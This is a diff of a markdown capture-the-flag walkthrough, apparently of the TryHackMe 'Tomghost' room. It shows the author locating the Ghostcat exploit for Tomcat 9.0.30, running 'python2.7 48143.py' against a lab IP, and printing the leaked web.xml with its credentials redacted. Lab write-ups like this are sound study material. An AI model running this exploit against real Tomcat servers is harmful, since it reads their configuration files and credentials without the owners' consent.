@@ -38,11 +38,60 @@ We can see that there are 4 main ports available. Since there is no port 80 \(re
 
 We now know that they are using the Apache version Tomcat 9.0.30. I will try to use msfconsole \(Metasploit\) in order to find out if there is a vulnerability against this. Searching on exploit-db.com led me to this:
 
-![exploit-db results for Tomcat](../../.gitbook/assets/image%20%283%29.png)
+![exploit-db results for Tomcat](../../.gitbook/assets/image%20%284%29.png)
 
 At this point, I am thinking that "Ghostcat" might be my way in. I then used searchsploit in order to see what exploits are currently on my ParrotOS relating to this:
 
-![searchsploit output](../../.gitbook/assets/image%20%284%29.png)
+![searchsploit output](../../.gitbook/assets/image%20%285%29.png)
 
+I will then copy this file to my local directory so I can use it for the exploit:
 
+![Copying to local directory](../../.gitbook/assets/image%20%281%29.png)
+
+I did get lost here because I did find the right exploit, but it was not working for some reason. I did have to search online at this part, and came upon this [website](https://cyber-99.co.uk/thm-tomghost), and I saw they were using a command similar to mine with only one change: they were using the "python2.7" command instead of the regular "python" command. I entered the following:
+
+```c
+python2.7 48143.py 10.10.151.10
+```
+
+The output to the command was the following:
+
+```markup
+Getting resource at ajp13://10.10.151.10:8009/asdf
+----------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to GhostCat
+	username:password <!----I took out the username and password----->
+  </description>
+
+</web-app>
+
+```
+
+After this, I saved the username and password. I had to see where the username and password would fit into. 
 
